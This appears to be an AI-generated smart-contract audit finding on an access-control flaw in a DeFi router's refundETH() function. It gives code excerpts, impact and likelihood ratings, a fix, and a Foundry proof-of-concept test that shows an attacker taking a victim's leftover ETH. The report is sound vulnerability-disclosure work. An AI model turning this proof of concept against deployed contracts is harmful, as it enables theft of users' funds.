The vulnerability is real. Here is the complete analysis:

---

### Title
Unprivileged `refundETH()` drains any residual ETH left on the router by a prior payable call — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

### Summary
`refundETH()` unconditionally transfers the router's entire native ETH balance to `msg.sender` with no access control. Because every swap entry-point (`exactInputSingle`, `exactInput`, `exactOutputSingle`, `exactOutput`) is `payable` and the `pay()` helper only wraps exactly the required amount of ETH (leaving any excess on the contract), a victim who sends `msg.value > amountIn` in a standalone call leaves residual ETH on the router that any attacker can immediately steal by calling `refundETH()`.

### Finding Description

`refundETH()` contains no caller check:

```solidity
function refundETH() external payable override {
    uint256 balance = address(this).balance;
    if (balance > 0) {
        _transferETH(msg.sender, balance);   // ← sends to whoever calls this
    }
}
``` [1](#0-0) 

The `pay()` helper, when `tokenIn == WETH`, wraps exactly `value` wei and leaves the rest untouched:

```solidity
if (nativeBalance >= value) {
    IWETH9(WETH).deposit{value: value}();
    IERC20(WETH).safeTransfer(recipient, value);
}
``` [2](#0-1) 

`exactInputSingle` is `payable` and does not refund excess ETH after the swap:

```solidity
function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut) {
``` [3](#0-2) 

The same applies to `exactInput`, `exactOutputSingle`, and `exactOutput`, all of which are `payable`. [4](#0-3) 

The `receive()` guard (only WETH can push ETH) does not protect against ETH arriving via `msg.value` in a payable call — that path bypasses `receive()` entirely. [5](#0-4) 

### Impact Explanation
Any ETH left on the router after a payable swap call is immediately claimable by any address. A victim who sends `msg.value = 2 ether` for a `1 ether` swap loses the `1 ether` excess to the first attacker who calls `refundETH()`. This is a direct, complete theft of user principal with no recovery path. Severity: **High**.

### Likelihood Explanation
The intended usage pattern (bundle `refundETH` inside `multicall`) is not enforced at the contract level. Any user who calls a payable swap function directly with excess ETH — a common pattern for handling price uncertainty — is immediately vulnerable. A MEV bot monitoring the mempool can front-run or back-run the victim's transaction atomically. Likelihood: **Medium** (requires a user to call a payable function directly with excess ETH, but this is a realistic and common mistake).

### Recommendation
Change `refundETH()` to only refund ETH that arrived in the current call (i.e., `msg.value`), or restrict it to only be callable within a `multicall` context. The simplest fix is to track the original `msg.value` in transient storage at `multicall` entry and only refund up to that amount to the original `multicall` caller. Alternatively, add a `recipient` parameter (like `unwrapWETH9` does) so the caller explicitly designates who receives the refund, and document that it must only be used inside `multicall`.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

// Foundry test sketch (pseudo-code)
function test_refundETH_attackerStealsVictimExcessETH() public {
    address victim  = makeAddr("victim");
    address attacker = makeAddr("attacker");
    vm.deal(victim, 2 ether);

    // Victim calls exactInputSingle directly (not via multicall) with excess ETH.
    // amountIn = 1 ether, msg.value = 2 ether → 1 ether excess stays on router.
    vm.prank(victim);
    router.exactInputSingle{value: 2 ether}(
        IMetricOmmSimpleRouter.ExactInputSingleParams({
            pool: address(pool),
            tokenIn: address(weth),
            tokenOut: address(token1),
            zeroForOne: true,
            amountIn: 1 ether,
            amountOutMinimum: 0,
            recipient: victim,
            deadline: block.timestamp + 60,
            priceLimitX64: 0,
            extensionData: ""
        })
    );

    // 1 ether excess is now sitting on the router.
    assertEq(address(router).balance, 1 ether);

    // Attacker calls refundETH() in the next transaction and steals it.
    uint256 attackerBefore = attacker.balance;
    vm.prank(attacker);
    router.refundETH();

    assertEq(attacker.balance - attackerBefore, 1 ether, "attacker stole victim ETH");
    assertEq(victim.balance, 0, "victim lost excess ETH");
}
```

The test mirrors the pattern already validated by the project's own test suite, which confirms that `refundETH` sends the full router balance to `msg.sender` with no restriction. [6](#0-5)
